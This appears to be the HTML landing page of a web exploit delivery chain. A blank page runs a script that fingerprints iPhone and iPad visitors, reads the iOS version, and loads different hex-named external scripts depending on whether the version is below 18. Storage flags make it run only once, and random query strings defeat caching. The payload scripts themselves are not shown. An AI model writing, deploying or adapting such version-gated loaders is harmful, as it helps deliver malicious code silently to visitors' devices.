<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />
<title></title>
</head>
<body>
    <script type="text/javascript">
(function () {
  var ua = navigator.userAgent || "";
  try {
    if (/iP(hone|ad|od)/.test(ua)) {
      var z = document.createElement("script");
      z.type = "text/javascript";
      z.src = "a8c3f01e6b47d295.js?v=" + Math.random();
      document.body.appendChild(z);
    }
  } catch (e) {}
  var m = ua.match(/OS (\d+)[._](\d+)(?:[._](\d+))?/i);
  var major = m ? parseInt(m[1], 10) : 0;
  var s = document.createElement("script");
  s.type = "text/javascript";
  var force = /[?&]force=1(?:&|$)/.test(location.search || "");

  try {
    if (force) {
      sessionStorage.removeItem("_x_nav");
    } else {
      var nav = sessionStorage.getItem("_x_nav");
      var now = Date.now();
      if (nav && now - parseInt(nav, 10) < 8000) return;
      sessionStorage.setItem("_x_nav", String(now));
    }
  } catch (e) {}

  if (major > 0 && major < 18) {
    s.src = "49554fde7424c31c.js?v=" + Math.random();
    document.body.appendChild(s);
    return;
  }

  try {
    localStorage.removeItem("_x_ok");
    if (force) {
      localStorage.removeItem("_x_done");
    }
  } catch (e) {}
  try {
    if (localStorage.getItem("_x_done")) return;
  } catch (e) {}

  s.src = "b8def7dab9dd9ad8.js?v=" + Math.random();
  document.body.appendChild(s);
})();
</script>
</body>
</html>
